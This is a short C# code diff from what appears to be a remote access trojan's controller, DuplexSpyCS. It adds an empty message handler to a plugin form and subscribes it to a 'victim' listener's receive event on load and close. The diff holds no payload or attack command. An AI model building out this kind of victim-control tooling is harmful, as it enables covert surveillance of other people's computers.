@@ -25,6 +25,11 @@ namespace DuplexSpyCS
             m_szPluginDirectory = m_iniMgr.Read("Plugin", "Directory");
         }
 
+        void fnRecv(clsListener listener, clsVictim victim, List<string> lsMsg)
+        {
+
+        }
+
         void fnRefresh()
         {
             listView1.Items.Clear();
@@ -36,12 +41,19 @@ namespace DuplexSpyCS
 
         void fnSetup()
         {
+            m_victim.m_listener.ReceivedDecoded += fnRecv;
+
             fnRefresh();
         }
 
         private void frmPlugin_Load(object sender, EventArgs e)
         {
             fnSetup();
+        }
+
+        private void frmPlugin_FormClosed(object sender, FormClosedEventArgs e)
+        {
+            m_victim.m_listener.ReceivedDecoded -= fnRecv;
         }
     }
 }
